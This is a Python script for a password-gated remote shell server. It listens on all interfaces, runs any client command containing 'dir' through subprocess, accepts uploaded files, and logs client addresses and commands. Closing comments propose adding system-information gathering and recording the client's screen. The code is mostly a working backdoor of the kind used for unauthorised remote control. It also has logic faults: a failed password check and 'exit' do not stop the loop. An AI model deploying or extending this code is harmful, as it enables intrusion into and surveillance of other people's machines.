import socket
import subprocess
import tqdm
import os

SEPARATOR = "<SEPARATOR>"
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 3847

BUFFER_SIZE = 4096

s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

file = open("ips.txt","a")
file.write(f"{client_address[0]}:{client_address[1]} \n")
file.close()

message = "Hello and Welcome".encode()
client_socket.send(message)

corr = client_socket.recv(BUFFER_SIZE).decode()

if corr.lower() != "9182736455":
   client_socket.close()
   s.close()   

while True:
   command = client_socket.recv(BUFFER_SIZE).decode()
   file = open("ips.txt","a")
   file.write(f"{command} \n")
   file.close() 

   if command.lower() == "exit":
      client_socket.close()
   
   if "jarvis" in command:
      
      command = command.replace("jarvis ", "")

      if "dir" in command:
         output = subprocess.getoutput(command)
         client_socket.send(output.encode())

      elif "send" in command:
         received = client_socket.recv(BUFFER_SIZE).decode()
         filename, filesize = received.split(SEPARATOR)
         # remove absolute path if there is
         filename = os.path.basename(filename)
         
         # convert to integer
         filesize = int(filesize)

         client_socket.send("ok".encode())

         progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
         with open(filename, "wb") as f:
            for _ in progress:
               # read 1024 bytes from the socket (receive)
               bytes_read = client_socket.recv(BUFFER_SIZE)
               if not bytes_read:    
                  # nothing is received
                  # file transmitting is done
                  break
               # write to the file the bytes we just received
               f.write(bytes_read)
               # update the progress bar
               progress.update(len(bytes_read)) 

      else:
         client_socket.send("wut".encode())

   else: 
      client_socket.send("you suck".encode()) 
      break
   
   print(command)

client_socket.close()
s.close()

# Use threading built-in module to enable the server to accept multiple client connections in the same time.
# Add a custom command that gets system and hardware information using psutil third party module, check this tutorial: How to Get Hardware and System Information in Python.
# Make a custom command to record the client's screen and then download the video recorded, this tutorial can help: How to Make a Screen Recorder in Python.
# Replace the greeting with information like the current working directory using os.getcwd() function in the built-in os module.
# And many more ! There are endless of possibilities, the only limit here is your imagination !
